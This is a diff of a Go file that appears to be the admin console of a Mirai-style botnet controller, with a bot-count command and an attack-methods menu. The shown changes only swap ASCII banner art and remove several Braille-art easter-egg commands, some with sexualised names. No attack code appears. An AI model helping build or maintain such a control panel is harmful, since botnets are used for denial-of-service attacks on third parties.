@@ -109,17 +109,15 @@ func (this *Admin) Handle() {
 		if cmd == "clear" || cmd == "cls" || cmd == "c" {
         this.conn.Write([]byte("\x1b[2J\x1b[1H"))
         this.conn.Write([]byte("\x1b\r\n"))
-        this.conn.Write([]byte("\x1b[1;36m    |----/|                                    \x1b[0m\r\n"))         
-        this.conn.Write([]byte("\x1b[1;36m    | ,_, |                                    \x1b[0m\r\n"))
-        this.conn.Write([]byte("\x1b[1;36m     |_`_/-\x1b[1;37m..----.                   \x1b[0m\r\n"))
-        this.conn.Write([]byte("\x1b[1;36m  ___/ `   \x1b[1;37m' ,    |  \x1b[1;36mhave a \x1b[1;37mnice day\x1b[0m\r\n"))
-        this.conn.Write([]byte("\x1b[1;36m (__...'   \x1b[1;37m__|    |`.___.';          \x1b[0m\r\n"))
-        this.conn.Write([]byte("\x1b[1;36m   (_,...'(\x1b[1;37m_,.`__)/'.....+           \x1b[0m\r\n"))
-    	this.conn.Write([]byte("\x1b\r\n"))
+        this.conn.Write([]byte("|\      _,,,---,,_n"))         
+        this.conn.Write([]byte("\x1b[1;36mZZZzz /,`.-'`'    -.  ;-;;,_\x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m     |,4-  ) )-,_. ,\ (  `'-'\x1b[0m\r\n"))
+        this.conn.Write([]byte("\x1b[1;36m    '---''(_/--'  `-'\_)  Sleepy Cat\x1b[0m\r\n"))
         this.conn.Write([]byte("\x1b\r\n"))
+        this.conn.Write([]byte("\x1b By pusheen ^_^ \r\n"))
+        this.conn.Write([]byte("\x1b Forked from hoaan1995 :3 \r\n"))
 		continue
 		}
-
 		if cmd == "help" || cmd == "HELP" { // display help menu
 			this.conn.Write([]byte("\r\n"))
 			this.conn.Write([]byte("\x1b[1;36mMETHODS\x1b[1;31m: \033[0mSHOW ALL COMMANDS \r\n"))
@@ -582,51 +580,6 @@ func (this *Admin) Handle() {
             time.Sleep(100 * time.Millisecond)
         }
 
-        if err != nil || cmd == "pikachu" || cmd == "PIKACHU" {
-            this.conn.Write([]byte("\033[2J\033[1H")) //header
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\033[37m   ⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⣠⣤⣶⣶  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢰⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣾⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⡏⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠁⠀⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠙⠿⠿⠿⠻⠿⠿⠟⠿⠛⠉⠀⠀⠀⠀⠀⣸⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣴⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢰⣹⡆⠀⠀⠀⠀⠀⠀⣭⣷⠀⠀⠀⠸⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠈⠉⠀⠀⠤⠄⠀⠀⠀⠉⠁⠀⠀⠀⠀⢿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⢾⣿⣷⠀⠀⠀⠀⡠⠤⢄⠀⠀⠀⠠⣿⣿⣷⠀⢸⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⡀⠉⠀⠀⠀⠀⠀⢄⠀⢀⠀⠀⠀⠀⠉⠉⠁⠀⠀⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            continue
-        }
-
-        if err != nil || cmd == "saitama" || cmd == "SAITAMA" {
-            this.conn.Write([]byte("\033[2J\033[1H")) //header
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀⢠⠞⠉⠙⠲.\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀⢳⡀⠀⡏⠀⠀⠀⠀⠀⢷\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀⢸⠀⠀⠀⠀⠀ ⡇\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀⣸⠀⠀OK⠀ ⡇\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿⠀⢹⠀⠀⠀⠀⠀ ⡇\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀⡇⠀⠀⠀⠀⡼\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀⠘⠤⣄⣠⠞\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁\r\n"))
-            this.conn.Write([]byte("\033[37m   ⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀\r\n"))
-            this.conn.Write([]byte("\033[37m   ⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿\r\n"))
-            this.conn.Write([]byte("\033[37m   ⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸\r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣧⣀⣿………⣀⣰⣏⣘⣆⣀r\r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            continue
-        }
-
         if err != nil || cmd == "uwu" || cmd == "UWU" {
             this.conn.Write([]byte("\033[2J\033[1H")) //header
             this.conn.Write([]byte("\r\n"))
@@ -650,56 +603,7 @@ func (this *Admin) Handle() {
             this.conn.Write([]byte("\r\n"))
             continue
         }
-
-        if err != nil || cmd == "loli" || cmd == "LOLI" {
-            this.conn.Write([]byte("\033[2J\033[1H")) //header
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\033[37m   ⡿⠋⠄⣀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⠻⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣮⠛⣿⣿⣿⣿⣿⣿⡆  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⡟⢻⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⠄⡀⢬⣭⣻⣷⡌⢿⣿⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⠃⣸⡀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣆⢹⣿⣿⣿⡈⢿⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⠄⢻⡇⠄⢛⣛⣻⣿⣿⣿⣿⣿⣿⣿⣿⡆⠹⣿⣆⠸⣆⠙⠛⠛⠃⠘⣿⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⠄⠸⣡⠄⡈⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠁⣠⣉⣤⣴⣿⣿⠿⠿⠿⡇⢸⣿⣿⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⠄⡄⢿⣆⠰⡘⢿⣿⠿⢛⣉⣥⣴⣶⣿⣿⣿⣿⣻⠟⣉⣤⣶⣶⣾⣿⡄⣿⡿⢸  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⠄⢰⠸⣿⠄⢳⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⡇⢻⡇⢸  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⢷⡈⢣⣡⣶⠿⠟⠛⠓⣚⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⠇⠘  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⡀⣌⠄⠻⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⢿⣿⣿⣿⣿⣿⡟⠘⠄⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣷⡘⣷⡀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡋⢀⣠⣤⣶⣶⣾⡆⣿⣿⣿⠟⠁⠄⠄⠄⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣷⡘⣿⡀⢻⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣿⣿⣿⣿⣷⡿⠟⠉⠄⠄⠄⠄⡄⢀  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣷⡈⢷⡀⠙⠛⠻⠿⠿⠿⠿⠿⠷⠾⠿⠟⣛⣋⣥⣶⣄⠄⢀⣄⠹⣦⢹⣿  \r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            continue
-        }
-
-        if err != nil || cmd == "hentai" || cmd == "HENTAI" {
-            this.conn.Write([]byte("\033[2J\033[1H")) //header
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⠟⣽⣿⣿⣿⣿⣿⢣⠟⠋⡜⠄⢸⣿⣿⡟⣬⢁⠠⠁⣤⠄⢰⠄⠇⢻⢸  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⢏⣾⣿⣿⣿⠿⣟⢁⡴⡀⡜⣠⣶⢸⣿⣿⢃⡇⠂⢁⣶⣦⣅⠈⠇⠄⢸⢸  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣹⣿⣿⣿⡗⣾⡟⡜⣵⠃⣴⣿⣿⢸⣿⣿⢸⠘⢰⣿⣿⣿⣿⡀⢱⠄⠨⢸  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⡇⣿⢁⣾⣿⣾⣿⣿⣿⣿⣸⣿⡎⠐⠒⠚⠛⠛⠿⢧⠄⠄⢠⣼  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣿⣿⣿⠃⠿⢸⡿⠭⠭⢽⣿⣿⣿⢂⣿⠃⣤⠄⠄⠄⠄⠄⠄⠄⠄⣿⡾  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣼⠏⣿⡏⠄⠄⢠⣤⣶⣶⣾⣿⣿⣟⣾⣾⣼⣿⠒⠄⠄⠄⡠⣴⡄⢠⣿⣵  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣳⠄⣿⠄⠄⢣⠸⣹⣿⡟⣻⣿⣿⣿⣿⣿⣿⡿⡻⡖⠦⢤⣔⣯⡅⣼⡿⣹  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⡿⣼⢸⠄⠄⣷⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣕⡜⡌⡝⡸⠙⣼⠟⢱⠏  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⡇⣿⣧⡰⡄⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣋⣪⣥⢠⠏⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣧⢻⣿⣷⣧⢻⣿⣿⣿⡇⠄⢀⣀⣀⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠂⠄⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⢹⣼⣿⣿⣿⣧⡻⣿⣿⣇⣴⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣰⠄⠄⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣼⡟⡟⣿⢸⣿⣿⣝⢿⣿⣾⣿⣿⣿⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⡀⡀  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⢰⣿⢹⢸⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠉⠄⠄⣸⢰⡇  \r\n"))
-            this.conn.Write([]byte("\033[37m   ⣿⣾⣹⣏⢸⣿⣿⣿⣿⣿⣷⣍⡻⣛⣛⣛⡉⠁⠄⠄⠄⠄⠄⠄⢀⢇⡏⠄  \r\n"))
-            this.conn.Write([]byte("\033[37m\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            this.conn.Write([]byte("\r\n"))
-            continue
-        }
-
+		
 		if cmd == "bots" || cmd == "BOTS" {
 			botCount = clientList.Count()
 			m := clientList.Distribution()
